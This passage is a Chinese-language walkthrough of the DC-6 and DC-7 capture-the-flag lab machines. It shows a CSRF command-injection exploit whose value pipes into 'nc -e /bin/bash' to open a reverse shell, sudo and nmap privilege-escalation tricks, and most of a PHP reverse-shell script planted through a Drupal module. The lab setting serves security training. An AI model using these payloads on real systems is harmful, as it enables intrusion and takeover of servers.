<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/~# searchsploit wordpress activity monitor</span><br><span class="line">------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                   	       |  Path</span><br><span class="line">                                	       | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Plainview ...			   | exploits/php/webapps/45274.html</span><br><span class="line">------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@Knlvre:/~# searchsploit -m exploits/php/webapps/45274.html</span><br><span class="line">  Exploit: WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/45274</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/45274.html</span><br><span class="line">File Type: HTML document, ASCII text, with CRLF line terminators</span><br><span class="line">Copied to: /var/www/html/45274.html</span><br></pre></td></tr></table></figure>
<p>查看<code>45274.html</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/~# cat 45274.html </span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">About:</span></span><br><span class="line"><span class="comment">===========</span></span><br><span class="line"><span class="comment">Component: Plainview Activity Monitor (Wordpress plugin)</span></span><br><span class="line"><span class="comment">Vulnerable version: 20161228 and possibly prior</span></span><br><span class="line"><span class="comment">Fixed version: 20180826</span></span><br><span class="line"><span class="comment">CVE-ID: CVE-2018-15877</span></span><br><span class="line"><span class="comment">CWE-ID: CWE-78</span></span><br><span class="line"><span class="comment">Author:</span></span><br><span class="line"><span class="comment">- LydA(c)ric Lefebvre (https://www.linkedin.com/in/lydericlefebvre)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Timeline:</span></span><br><span class="line"><span class="comment">===========</span></span><br><span class="line"><span class="comment">- 2018/08/25: Vulnerability found</span></span><br><span class="line"><span class="comment">- 2018/08/25: CVE-ID request</span></span><br><span class="line"><span class="comment">- 2018/08/26: Reported to developer</span></span><br><span class="line"><span class="comment">- 2018/08/26: Fixed version</span></span><br><span class="line"><span class="comment">- 2018/08/26: Advisory published on GitHub</span></span><br><span class="line"><span class="comment">- 2018/08/26: Advisory sent to bugtraq mailing list</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Description:</span></span><br><span class="line"><span class="comment">===========</span></span><br><span class="line"><span class="comment">Plainview Activity Monitor Wordpress plugin is vulnerable to OS</span></span><br><span class="line"><span class="comment">command injection which allows an attacker to remotely execute</span></span><br><span class="line"><span class="comment">commands on underlying system. Application passes unsafe user supplied</span></span><br><span class="line"><span class="comment">data to ip parameter into activities_overview.php.</span></span><br><span class="line"><span class="comment">Privileges are required in order to exploit this vulnerability, but</span></span><br><span class="line"><span class="comment">this plugin version is also vulnerable to CSRF attack and Reflected</span></span><br><span class="line"><span class="comment">XSS. Combined, these three vulnerabilities can lead to Remote Command</span></span><br><span class="line"><span class="comment">Execution just with an admin click on a malicious link.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">References:</span></span><br><span class="line"><span class="comment">===========</span></span><br><span class="line"><span class="comment">https://github.com/aas-n/CVE/blob/master/CVE-2018-15877/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PoC:</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--  Wordpress Plainview Activity Monitor RCE</span></span><br><span class="line"><span class="comment">        [+] Version: 20161228 and possibly prior</span></span><br><span class="line"><span class="comment">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span></span><br><span class="line"><span class="comment">        [+] Author: LydA(c)ric LEFEBVRE</span></span><br><span class="line"><span class="comment">        [+] CVE-ID: CVE-2018-15877</span></span><br><span class="line"><span class="comment">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span></span><br><span class="line"><span class="comment">        [+] <span class="doctag">Note:</span> Many reflected XSS exists on this plugin and can be combine with this exploit as well</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"ip"</span> <span class="attr">value</span>=<span class="string">"google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"lookup"</span> <span class="attr">value</span>=<span class="string">"Lookup"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据提示，我们修改部分内容：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"ip"</span> <span class="attr">value</span>=<span class="string">"google.fr| nc -e /bin/bash 192.168.199.133 3737"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"lookup"</span> <span class="attr">value</span>=<span class="string">"Lookup"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>然后现在攻击机这段开启端口监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvnp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br></pre></td></tr></table></figure>
<p>再去访问<code>http://127.0.0.1/45274.html</code>，点击<code>Submit request</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/6-2.png" alt="6-2"></p>
<p>就这样返回了shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvnp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br><span class="line">connect to [192.168.199.133] from (UNKNOWN) [192.168.199.107] 53980</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">www-data@dc-6:/var/www/html/wp-admin$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
<p>将提权工具<code>LinEnum</code>上传到靶机，检测后无利用点。查看<code>/home</code>目录，发现有4个目录，一一查看之后发现两个文件：①<code>/home/mark/stuff</code>目录下的<code>things-to-do.txt</code>，②<code>/home/mark/stuff</code>目录下的<code>bakups.sh</code>。查看第一个文件，提示如下</p>
<blockquote>
<p>Things to do:</p>
<ul>
<li>Restore full functionality for the hyperdrive (need to speak to Jens)</li>
<li>Buy present for Sarah’s farewell party</li>
<li>Add new user: graham - GSo7isUM1D4 - done</li>
<li>Apply for the OSCP course</li>
<li>Buy new laptop for Sarah’s replacement</li>
</ul>
</blockquote>
<p>查看第二个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@dc-6:/home/jens$ cat backups.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">tar -czf backups.tar.gz /var/www/html</span><br></pre></td></tr></table></figure>
<p>提示中的用户名密码会不会是<code>ssh</code>？尝试一下，果然是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/~# ssh graham@192.168.43.22</span><br><span class="line">...</span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">graham@dc-6:~$ id</span><br><span class="line">uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)</span><br></pre></td></tr></table></figure>
<p><code>sudo -l</code>后出现提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">graham@dc-6:~$ sudo -l</span><br><span class="line">Matching Defaults entries for graham on dc-6:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User graham may run the following commands on dc-6:</span><br><span class="line">    (jens) NOPASSWD: /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
<blockquote>
<p>User graham may run the following commands on dc-6:<br>   (jens) NOPASSWD: /home/jens/backups.sh</p>
</blockquote>
<p>按照提示尝试运行<code>backups.sh</code>文件，就能不输入密码成为<code>jens</code>。首先，在文件中写入<code>/bin/sh</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">graham@dc-6:/home/jens$ echo &quot;/bin/sh&quot; &gt; backups.sh</span><br><span class="line">graham@dc-6:/home/jens$ cat backups.sh</span><br><span class="line">/bin/sh</span><br><span class="line">graham@dc-6:/home/jens$ sudo -u jens ./backups.sh</span><br><span class="line">$ id</span><br><span class="line">uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">jens@dc-6:~$</span><br></pre></td></tr></table></figure>
<p>继续查看权限，出现提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jens@dc-6:~$ sudo -l</span><br><span class="line">Matching Defaults entries for jens on dc-6:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jens may run the following commands on dc-6:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br></pre></td></tr></table></figure>
<blockquote>
<p>User jens may run the following commands on dc-6:<br>   (root) NOPASSWD: /usr/bin/nmap</p>
</blockquote>
<p>提示可以使用<code>nmap</code>提权，低版本(2.02-5.21)可以直接提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jens@dc-6:~$ sudo nmap nmap --interactive+</span><br><span class="line">!sh</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
<p>高版本需要插件提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jens@dc-6:~$ echo &apos;os.execute(&quot;/bin/sh&quot;)&apos; &gt; TE.nse</span><br><span class="line">jens@dc-6:~$ sudo nmap --script=/home/jens/TE.nse</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-09-26 11:25 AEST</span><br><span class="line"># python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;	#执行但没有回显</span><br><span class="line">root@dc-6:/home/jens# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
<p>查找并查看flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@dc-6:/home/jens# find / -name *flag*</span><br><span class="line">...</span><br><span class="line">/root/theflag.txt</span><br><span class="line"></span><br><span class="line">root@dc-6:/home/jens# cat /root/theflag.txt</span><br><span class="line"></span><br><span class="line">Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b </span><br><span class="line"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&apos; </span><br><span class="line">   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
<h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><h2 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
<p>攻击机：Kali（IP：192.168.43.84）</p>
<p>靶机：DC-7（IP：192.168.43.29）</p>
<h2 id="渗透测试-2"><a href="#渗透测试-2" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描IP，开放<code>22</code>和<code>80</code>端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~# nmap -p- -A 192.168.43.29</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-27 09:36 CST</span><br><span class="line">Nmap scan report for bogon (192.168.43.29)</span><br><span class="line">Host is up (0.0035s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)</span><br><span class="line">|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)</span><br><span class="line">|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-generator: Drupal 8 (https://www.drupal.org)</span><br><span class="line">| http-robots.txt: 22 disallowed entries (15 shown)</span><br><span class="line">| /core/ /profiles/ /README.txt /web.config /admin/ </span><br><span class="line">| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ </span><br><span class="line">| /user/password/ /user/login/ /user/logout/ /index.php/admin/ </span><br><span class="line">|_/index.php/comment/reply/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Welcome to DC-7 | D7</span><br><span class="line">MAC Address: 00:0C:29:BB:F1:42 (VMware)</span><br><span class="line">Device type: general purpose</span><br></pre></td></tr></table></figure>
<p>访问80端口，发现是<code>Drupal框架</code>。第一时间想到<code>MSF</code>，搜索<code>drupal</code>，利用了几个最新的模块后都没能成功拿到shell。回到网页看提示</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/7-1.png" alt="7-1"></p>
<blockquote>
<p>Welcome to DC-7</p>
<p>DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are.  :-)</p>
<p>While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed.</p>
<p>What you will have to do, is to think “outside” the box.</p>
<p>Way “outside” the box.  :-)</p>
</blockquote>
<p>注意到这里的提示<code>outside</code>和底部的<code>DC7USER</code>，这里需要<code>推特</code>搜索这个用户，然后发现这个账户有一个链接：<a href="https://github.com/Dc7User" target="_blank" rel="noopener">https:/github.com/Dc7User</a>，我没有注册，所以直接用别人的图</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/7-2.png" alt="7-2"></p>
<p>打开这个连接之后，看到后看到一个叫<code>stuffdb</code>的<code>php仓库</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/7-3.png" alt="7-3"></p>
<p>进入之后出现了提示</p>
<blockquote>
<p>This is some “code” (yes, it’s not the greatest code, but that wasn’t the point) for the DC-7 challenge.</p>
<p>This isn’t a flag, btw, but if you have made it here, well done anyway.  :-)</p>
</blockquote>
<p>打开<code>login.php</code>没有发现账号密码，但是<code>include</code>了<code>config.php</code>，去查看看到了账号密码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$servername = <span class="string">"localhost"</span>; </span><br><span class="line">	$username = <span class="string">"dc7user"</span>; </span><br><span class="line">	$password = <span class="string">"MdR3xOgB7#dW"</span>; </span><br><span class="line">	$dbname = <span class="string">"Staff"</span>; </span><br><span class="line">	$conn = mysqli_connect($servername, $username, $password, $dbname); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>拿到上面的账号密码之后，想到刚才扫描端口有看到开放<code>22</code>号端口，直接拿去连接，果然成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> fingerprint is SHA256:J5aG8w2iY0G0Nh3p4L+WzXXaQ7O1GjFTlfAYwkBIbM4.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &apos;192.168.43.29&apos; (ECDSA) to the list of known hosts.</span><br><span class="line">dc7user@192.168.43.29&apos;s password: </span><br><span class="line">Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64</span><br><span class="line">...</span><br><span class="line">dc7user@dc-7:~$ id</span><br><span class="line">uid=1000(dc7user) gid=1000(dc7user) groups=1000(dc7user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br></pre></td></tr></table></figure>
<p>查看当前目录，发现了邮箱记录<code>mbox</code>，查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ ls</span><br><span class="line">backups  mbox</span><br><span class="line">dc7user@dc-7:~$ cat mbox</span><br><span class="line">...</span><br><span class="line">From root@dc-7 Fri Aug 30 03:15:17 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 30 Aug 2019 03:15:17 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">	(envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">	id 1i3O0y-0000Ed-To</span><br><span class="line">	for root@dc-7; Fri, 30 Aug 2019 03:15:17 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3O0y-0000Ed-To@dc-7&gt;</span><br><span class="line">Date: Fri, 30 Aug 2019 03:15:17 +1000</span><br><span class="line"></span><br><span class="line">rm: cannot remove &apos;/home/dc7user/backups/*&apos;: No such file or directory</span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>刚开始关注到这个<code>backups/website.sql</code>，查看之后发现是<code>gpg加密文件</code>，就先不去看。再次关注到邮件的<code>Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</code>，查看该文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:/opt/scripts$ cat backups.sh </span><br><span class="line">#!/bin/bash</span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure>
<p>关注到这个<code>drush</code>命令，是<code>drupal框架</code>中用来做一些配置的命令，它可以改变用户名密码，格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drush user-password admin --password=&quot;new_pass&quot;</span><br></pre></td></tr></table></figure>
<p>切换到<code>/var/www/html</code>下，用<code>drush</code>试着改变admin的密码，修改成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:/opt/scripts$ cd /var/www/html</span><br><span class="line">dc7user@dc-7:/var/www/html$ drush user-password admin --password=&quot;123456&quot;</span><br><span class="line">Changed password for admin</span><br></pre></td></tr></table></figure>
<p>回到浏览器，用admin登录，成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/7-4.png" alt="7-4"></p>
<p>进来后<code>Manage -&gt; Extend -&gt; List -&gt; Install new module</code>，进入安装新插件的页面</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/7-5.png" alt="7-5"></p>
<p>从下面的网页中下载插件<code>php-8.x-1.0.tar.gz</code>，然后点击<code>Install</code>上传到靶机上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.drupal.org/project/php</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/7-6.png" alt="7-6"></p>
<p>上传成功页面中，点击<code>Enable newly added modules</code>，前往激活插件</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/7-7.png" alt="7-7"></p>
<p>点开<code>FILTERS</code>选项卡，勾选<code>PHP Filter</code>，然后点击下方的<code>Install</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/7-8.png" alt="7-8"></p>
<p>现在回到主页，点击在左边的Tools栏中点击<code>Add content -&gt; Basic page</code></p>
<p>在<code>Body</code>栏内写入一个反向shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="line">// for any actions performed using this tool.  The author accepts no liability</span><br><span class="line">// for damage caused by this tool.  If these terms are not acceptable to you, then</span><br><span class="line">// do not use this tool.</span><br><span class="line">//</span><br><span class="line">// In all other respects the GPL version 2 applies:</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License version 2 as</span><br><span class="line">// published by the Free Software Foundation.</span><br><span class="line">//</span><br><span class="line">// This program is distributed in the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License for more details.</span><br><span class="line">//</span><br><span class="line">// You should have received a copy of the GNU General Public License along</span><br><span class="line">// with this program; if not, write to the Free Software Foundation, Inc.,</span><br><span class="line">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="line">//</span><br><span class="line">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="line">// for any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="line">// you, then do not use this tool.</span><br><span class="line">//</span><br><span class="line">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="line">// me at pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// Description</span><br><span class="line">// -----------</span><br><span class="line">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="line">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="line">//</span><br><span class="line">// Limitations</span><br><span class="line">// -----------</span><br><span class="line">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="line">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span><br><span class="line">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="line">//</span><br><span class="line">// Usage</span><br><span class="line">// -----</span><br><span class="line">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line">$VERSION = &quot;1.0&quot;;</span><br><span class="line">$ip = &apos;192.168.43.84&apos;;  // CHANGE THIS</span><br><span class="line">$port = 3737;       // CHANGE THIS</span><br><span class="line">$chunk_size = 1400;</span><br><span class="line">$write_a = null;</span><br><span class="line">$error_a = null;</span><br><span class="line">$shell = &apos;uname -a; w; id; /bin/sh -i&apos;;</span><br><span class="line">$daemon = 0;</span><br><span class="line">$debug = 0;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Daemonise ourself if possible to avoid zombies later</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">// our php process and avoid zombies.  Worth a try...</span><br><span class="line">if (function_exists(&apos;pcntl_fork&apos;)) &#123;</span><br><span class="line">	// Fork and have the parent process exit</span><br><span class="line">	$pid = pcntl_fork();</span><br><span class="line">	</span><br><span class="line">	if ($pid == -1) &#123;</span><br><span class="line">		printit(&quot;ERROR: Can&apos;t fork&quot;);</span><br><span class="line">		exit(1);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	if ($pid) &#123;</span><br><span class="line">		exit(0);  // Parent exits</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Make the current process a session leader</span><br><span class="line">	// Will only succeed if we forked</span><br><span class="line">	if (posix_setsid() == -1) &#123;</span><br><span class="line">		printit(&quot;Error: Can&apos;t setsid()&quot;);</span><br><span class="line">		exit(1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$daemon = 1;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Change to a safe directory</span><br><span class="line">chdir(&quot;/&quot;);</span><br><span class="line"></span><br><span class="line">// Remove any umask we inherited</span><br><span class="line">umask(0);</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Do the reverse shell...</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// Open reverse connection</span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$sock) &#123;</span><br><span class="line">	printit(&quot;$errstr ($errno)&quot;);</span><br><span class="line">	exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Spawn shell process</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from</span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to</span><br><span class="line">   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$process = proc_open($shell, $descriptorspec, $pipes);</span><br><span class="line"></span><br><span class="line">if (!is_resource($process)) &#123;</span><br><span class="line">	printit(&quot;ERROR: Can&apos;t spawn shell&quot;);</span><br><span class="line">	exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Set everything to non-blocking</span><br><span class="line">// Reason: Occsionally reads will block, even though stream_select tells us they 